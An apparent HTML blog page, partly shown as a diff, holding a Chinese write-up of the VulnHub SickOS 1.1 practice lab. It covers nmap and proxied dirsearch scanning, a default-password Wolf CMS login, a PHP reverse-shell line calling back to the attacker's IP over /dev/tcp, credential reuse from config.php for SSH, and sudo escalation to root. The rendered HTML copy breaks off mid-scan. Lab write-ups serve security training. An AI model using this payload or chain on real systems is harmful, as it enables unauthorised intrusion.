@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wh1teJ0kerのBlog</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@日常练习">
+    <meta name="author" content="Wh1teJ0ker">
+    <link rel="canonical" href="https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html">
+
+    <link rel="alternate" type="application/rss+xml" href="https://wh1tej0ker.github.io//index.xml" title="Wh1teJ0kerのBlog">
+
+    
+
+
+<script async defer data-website-id="56cc42c1-3656-4d3e-af3c-acded927b8ed" src="https://analytics.umami.is/script.js"></script>
+
+    <meta property="og:url" content="https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html">
+  <meta property="og:site_name" content="Wh1teJ0kerのBlog">
+  <meta property="og:title" content="VulnHub-SickOS1.1">
+  <meta property="og:description" content="日常练习">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-03-03T14:42:47+08:00">
+    <meta property="article:modified_time" content="2025-05-07T21:34:39+08:00">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="VulnHub-SickOS1.1">
+  <meta name="twitter:description" content="日常练习">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://wh1tej0ker.github.io/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "VulnHub-SickOS1.1",
+      "item": "https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "VulnHub-SickOS1.1",
+  "name": "VulnHub-SickOS1.1",
+  "description": "日常练习",
+  "keywords": [
+    
+  ],
+  "articleBody": "VulnHub-SickOS1.1 信息搜集 主机发现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ──(kali㉿kali)-[~] └─$ sudo nmap -sn 192.168.152.0/24 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:35 EDT Nmap scan report for 192.168.152.1 Host is up (0.00029s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 192.168.152.2 Host is up (0.00020s latency). MAC Address: 00:50:56:FB:F0:8A (VMware) Nmap scan report for 192.168.152.135 Host is up (0.00025s latency). MAC Address: 00:0C:29:E9:D0:28 (VMware) Nmap scan report for 192.168.152.254 Host is up (0.00033s latency). MAC Address: 00:50:56:E3:37:B1 (VMware) Nmap scan report for 192.168.152.131 Host is up. Nmap done: 256 IP addresses (5 hosts up) scanned in 1.99 seconds 端口扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(kali㉿kali)-[~] └─$ sudo nmap --min-rate 10000 -p- 192.168.152.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:36 EDT Nmap scan report for 192.168.152.135 Host is up (0.00032s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 3128/tcp open squid-http 8080/tcp closed http-proxy MAC Address: 00:0C:29:E9:D0:28 (VMware) Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds 发现开放端口仅存在两个，也就是22和3128，8080端口是关闭的，不可访问\n详细信息搜集 TCP扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~] └─$ sudo nmap -sT -sV -O -p22,3128,8080 192.168.152.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:00 EDT Nmap scan report for 192.168.152.135 Host is up (0.00050s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0) 3128/tcp open http-proxy Squid http proxy 3.1.19 8080/tcp closed http-proxy MAC Address: 00:0C:29:E9:D0:28 (VMware) Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 4.2 (92%), Linux 3.10 - 4.11 (92%), Linux 3.13 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%), Linux 3.13 - 3.16 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds 暂时没有发现有价值的信息，先进行下一步扫描\nUDP扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 (kali㉿kali)-[~/桌面] └─$ sudo nmap -sU 192.168.152.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:06 EDT Nmap scan report for 192.168.152.135 Host is up (0.00027s latency). PORT STATE SERVICE 22/udp open|filtered ssh 3128/udp open|filtered ndl-aas 8080/udp open|filtered http-alt MAC Address: 00:0C:29:E9:D0:28 (VMware) Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds vuln脚本扫描 1 2 3 4 5 6 7 8 9 10 11 12 └─$ sudo nmap -script=vuln -p80,3128,8080 192.168.152.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 04:01 EDT Nmap scan report for 192.168.152.135 Host is up (0.00042s latency). PORT STATE SERVICE 80/tcp filtered http 3128/tcp open squid-http 8080/tcp closed http-proxy MAC Address: 00:0C:29:E9:D0:28 (VMware) Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds 再尝试一下目录爆破\n目录爆破 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/桌面] └─$ dirsearch -u 192.168.152.135 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-18_04-02-33.txt ^[[B^[[B^[[B^[[B^[[B^[[B Target: http://192.168.152.135/ [04:02:39] Starting: Request timeout: http://192.168.152.135/ Task Completed 请求超时，很明显我们使用的是本地实验环境，在局域网中出现这种请求超时明显是不正常的，通过前面的一些提示，也足以联想到是否与之前8080端口显示的代理相关\n所以尝试使用3128端口的代理去再重新扫一次\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ┌──(kali㉿kali)-[~/桌面] └─$ dirsearch -u 192.168.152.135 --proxy 192.168.152.135:3128 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-20_05-18-25.txt Target: http://192.168.152.135/ [05:18:31] Starting: [05:18:33] 403 - 245B - /.ht_wsr.txt [05:18:33] 403 - 243B - /.htaccess.bak1 [05:18:33] 403 - 244B - /.htaccess.sample [05:18:33] 403 - 242B - /.htaccess.save [05:18:33] 403 - 243B - /.htaccess.orig [05:18:33] 403 - 244B - /.htaccess_orig [05:18:33] 403 - 242B - /.htaccessOLD [05:18:33] 403 - 243B - /.htaccess_sc [05:18:33] 403 - 243B - /.htaccessOLD2 [05:18:33] 403 - 239B - /.html [05:18:33] 403 - 239B - /.htm [05:18:33] 403 - 242B - /.htaccessBAK [05:18:33] 403 - 243B - /.httr-oauth [05:18:33] 403 - 247B - /.htpasswd_test [05:18:33] 403 - 245B - /.htaccess_extra [05:18:33] 403 - 243B - /.htpasswds [05:18:46] 403 - 242B - /cgi-bin/ [05:18:48] 200 - 109B - /connect [05:18:50] 403 - 241B - /doc/api/ [05:18:50] 403 - 246B - /doc/html/index.html [05:18:50] 403 - 239B - /doc/ [05:18:50] 403 - 248B - /doc/en/changes.html [05:18:50] 403 - 247B - /doc/stable.version [05:19:05] 200 - 58B - /robots.txt [05:19:06] 403 - 243B - /server-status [05:19:06] 403 - 243B - /server-status/ Task Completed 这次成功扫出了基础的信息\nweb渗透 将浏览器的代理设置到刚刚的ip和端口\n访问到robots.txt\n1 2 3 User-agent: * Disallow: / Dissalow: /wolfcms 发现存在wolfcms的信息\n访问connect，发现存在一些信息\n1 2 3 4 #!/usr/bin/python print \"I Try to connect things very frequently\\n\" print \"You may want to try my services\" 通过搜索引擎找到一个管理员路径/wolfcms/?/admin\n尝试弱口令，如果无果则选择爆破\n通过admin，admin成功登录\n​​\n发现很多页面都存在可执行的php代码，尝试插入一段代码，一句话木马或者反弹shell都行\n将这段代码插入页面，然后开一个监听端口，访问刚刚编辑后的页面\n1 \u003c?php exec(\"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.152.131/1234 0\u003e\u00261'\"); ?\u003e 拿到一个权限\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(kali㉿kali)-[~/桌面] └─$ nc -lnvp 1234 listening on [any] 1234 ... connect to [192.168.152.131] from (UNKNOWN) [192.168.152.135] 53138 bash: no job control in this shell www-data@SickOs:/var/www/wolfcms$ whoami whoami www-data www-data@SickOs:/var/www/wolfcms$ uname -a uname -a Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux www-data@SickOs:/var/www/wolfcms$ ip a ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000 link/ether 00:0c:29:e9:d0:28 brd ff:ff:ff:ff:ff:ff inet 192.168.152.135/24 brd 192.168.152.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::20c:29ff:fee9:d028/64 scope link valid_lft forever preferred_lft forever 现在开始查找办法\n查看当前目录，并且发现存在一个config.php文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 www-data@SickOs:/var/www/wolfcms$ ls ls CONTRIBUTING.md README.md composer.json config.php docs favicon.ico index.php public robots.txt wolf www-data@SickOs:/var/www/wolfcms$ cat config.php cat config.php \u003c?php // Database information: // for SQLite, use sqlite:/tmp/wolf.db (SQLite 3) // The path can only be absolute path or :memory: // For more info look at: www.php.net/pdo // Database settings: define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); define('DB_USER', 'root'); define('DB_PASS', 'john@123'); define('TABLE_PREFIX', ''); // Should Wolf produce PHP error messages for debugging? define('DEBUG', false); // Should Wolf check for updates on Wolf itself and the installed plugins? define('CHECK_UPDATES', true); // The number of seconds before the check for a new Wolf version times out in case of problems. define('CHECK_TIMEOUT', 3); // The full URL of your Wolf CMS install define('URL_PUBLIC', '/wolfcms/'); // Use httpS for the backend? // Before enabling this, please make sure you have a working HTTP+SSL installation. define('USE_HTTPS', false); // Use HTTP ONLY setting for the Wolf CMS authentication cookie? // This requests browsers to make the cookie only available through HTTP, so not javascript for example. // Defaults to false for backwards compatibility. define('COOKIE_HTTP_ONLY', false); // The virtual directory name for your Wolf CMS administration section. define('ADMIN_DIR', 'admin'); // Change this setting to enable mod_rewrite. Set to \"true\" to remove the \"?\" in the URL. // To enable mod_rewrite, you must also change the name of \"_.htaccess\" in your // Wolf CMS root directory to \".htaccess\" define('USE_MOD_REWRITE', false); // Add a suffix to pages (simluating static pages '.html') define('URL_SUFFIX', '.html'); // Set the timezone of your choice. // Go here for more information on the available timezones: // http://php.net/timezones define('DEFAULT_TIMEZONE', 'Asia/Calcutta'); // Use poormans cron solution instead of real one. // Only use if cron is truly not available, this works better in terms of timing // if you have a lot of traffic. define('USE_POORMANSCRON', false); // Rough interval in seconds at which poormans cron should trigger. // No traffic == no poormans cron run. define('POORMANSCRON_INTERVAL', 3600); // How long should the browser remember logged in user? // This relates to Login screen \"Remember me for xxx time\" checkbox at Backend Login screen // Default: 1800 (30 minutes) define ('COOKIE_LIFE', 1800); // 30 minutes // Can registered users login to backend using their email address? // Default: false define ('ALLOW_LOGIN_WITH_EMAIL', false); // Should Wolf CMS block login ability on invalid password provided? // Default: true define ('DELAY_ON_INVALID_LOGIN', true); // How long should the login blockade last? // Default: 30 seconds define ('DELAY_ONCE_EVERY', 30); // 30 seconds // First delay starts after Nth failed login attempt // Default: 3 define ('DELAY_FIRST_AFTER', 3); // Secure token expiry time (prevents CSRF attacks, etc.) // If backend user does nothing for this time (eg. click some link) // his token will expire with appropriate notification // Default: 900 (15 minutes) define ('SECURE_TOKEN_EXPIRY', 900); // 15 minutes 发现存在一个账户密码\n1 2 define('DB_USER', 'root'); define('DB_PASS', 'john@123'); 查看一下当前的用户\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 www-data@SickOs:/var/www/wolfcms$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:105::/var/run/dbus:/bin/false whoopsie:x:103:106::/nonexistent:/bin/false landscape:x:104:109::/var/lib/landscape:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false 挨个尝试是否能通过密码进行ssh登录操作\n成功登录上sickos用户\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ┌──(kali㉿kali)-[~/桌面] └─$ ssh sickos@192.168.152.135 The authenticity of host '192.168.152.135 (192.168.152.135)' can't be established. ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '192.168.152.135' (ECDSA) to the list of known hosts. sickos@192.168.152.135's password: Permission denied, please try again. sickos@192.168.152.135's password: Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686) * Documentation: https://help.ubuntu.com/ System information as of Wed Mar 20 15:30:12 IST 2024 System load: 0.0 Processes: 116 Usage of /: 4.3% of 28.42GB Users logged in: 0 Memory usage: 12% IP address for eth0: 192.168.152.135 Swap usage: 0% Graph this data and manage this system at: https://landscape.canonical.com/ 124 packages can be updated. 92 updates are security updates. New release '14.04.3 LTS' available. Run 'do-release-upgrade' to upgrade to it. Last login: Tue Sep 22 08:32:44 2015 Linux提权 查看当前权限\n1 2 3 4 5 6 7 sickos@SickOs:~$ sudo -l [sudo] password for sickos: Matching Defaults entries for sickos on this host: env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User sickos may run the following commands on this host: (ALL : ALL) ALL 很明显直接sudo su即可\n1 2 3 4 5 6 7 root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt ^BIf you are viewing this!! ROOT! You have Succesfully completed SickOS1.1. Thanks for Trying ‍\n",
+  "wordCount" : "2683",
+  "inLanguage": "en",
+  "datePublished": "2025-03-03T14:42:47+08:00",
+  "dateModified": "2025-05-07T21:34:39+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Wh1teJ0ker"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Wh1teJ0kerのBlog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://wh1tej0ker.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/favicon.ico">
+
+<link rel="manifest" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css" />
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css" integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin="anonymous" media="screen" />
+    
+
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.65a3017a8aabe1f9330e70527075c8d51bc9634d5cac35077af03588c1df8078.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            HOME
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/friends/">友链</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/about/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io">Dashboard</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/Wh1teJ0ker"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-search">
+                <a href="javascript:void(0)" id="search-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                </a>
+            </li>
+
+            
+        </ul>
+        
+    </section>
+</nav>
+
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>VulnHub-SickOS1.1</h1>
+  </header>
+
+  <p>
+  <small>
+    March 3, 2025&nbsp;· &nbsp;· </small>
+
+  
+<p>
+
+  <div class="blog-body">
+    <div class="blog-toc">
+      <details open class="toc-details">
+    <summary class="toc-summary">目录</summary>
+    <div class="toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息搜集">信息搜集</a>
+      <ul>
+        <li><a href="#主机发现">主机发现</a></li>
+        <li><a href="#端口扫描">端口扫描</a></li>
+        <li><a href="#详细信息搜集">详细信息搜集</a>
+          <ul>
+            <li><a href="#tcp扫描">TCP扫描</a></li>
+            <li><a href="#udp扫描">UDP扫描</a></li>
+            <li><a href="#vuln脚本扫描">vuln脚本扫描</a></li>
+          </ul>
+        </li>
+        <li><a href="#目录爆破">目录爆破</a></li>
+      </ul>
+    </li>
+    <li><a href="#web渗透">web渗透</a></li>
+    <li><a href="#linux提权">Linux提权</a></li>
+  </ul>
+</nav>
+    </div>
+</details>
+    </div>
+
+    <div class="blog-content-wrapper">
+      <section class="blog-content"><h1 id="vulnhub-sickos11">VulnHub-SickOS1.1</h1>
+<h2 id="信息搜集">信息搜集</h2>
+<h3 id="主机发现">主机发现</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sn 192.168.152.0/24  
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:35 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.1
+</span></span><span class="line"><span class="cl">Host is up (0.00029s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:C0:00:08 (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.2
+</span></span><span class="line"><span class="cl">Host is up (0.00020s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:FB:F0:8A (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.135
+</span></span><span class="line"><span class="cl">Host is up (0.00025s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E9:D0:28 (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.254
+</span></span><span class="line"><span class="cl">Host is up (0.00033s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:E3:37:B1 (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.131
+</span></span><span class="line"><span class="cl">Host is up.
+</span></span><span class="line"><span class="cl">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.99 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="端口扫描">端口扫描</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap --min-rate 10000 -p- 192.168.152.135
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:36 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.135
+</span></span><span class="line"><span class="cl">Host is up (0.00032s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65532 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT     STATE  SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open   ssh
+</span></span><span class="line"><span class="cl">3128/tcp open   squid-http
+</span></span><span class="line"><span class="cl">8080/tcp closed http-proxy
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E9:D0:28 (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现开放端口仅存在两个，也就是22和3128，8080端口是关闭的，不可访问</p>
+<h3 id="详细信息搜集">详细信息搜集</h3>
+<h4 id="tcp扫描">TCP扫描</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sT -sV -O -p22,3128,8080 192.168.152.135
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:00 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.135
+</span></span><span class="line"><span class="cl">Host is up (0.00050s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE  SERVICE    VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">3128/tcp open   http-proxy Squid http proxy 3.1.19
+</span></span><span class="line"><span class="cl">8080/tcp closed http-proxy
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:E9:D0:28 (VMware)
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 4.2 (92%), Linux 3.10 - 4.11 (92%), Linux 3.13 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%), Linux 3.13 - 3.16 (90%)
+</span></span><span class="line"><span class="cl">No exact OS matches for host (test conditions non-ideal).
+</span></span><span class="line"><span class="cl">Network Distance: 1 hop
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>暂时没有发现有价值的信息，先进行下一步扫描</p>
+<h4 id="udp扫描">UDP扫描</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sU  192.168.152.135
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:06 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.135
+</span></span><span class="line"><span class="cl">Host is up (0.00027s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE         SERVICE
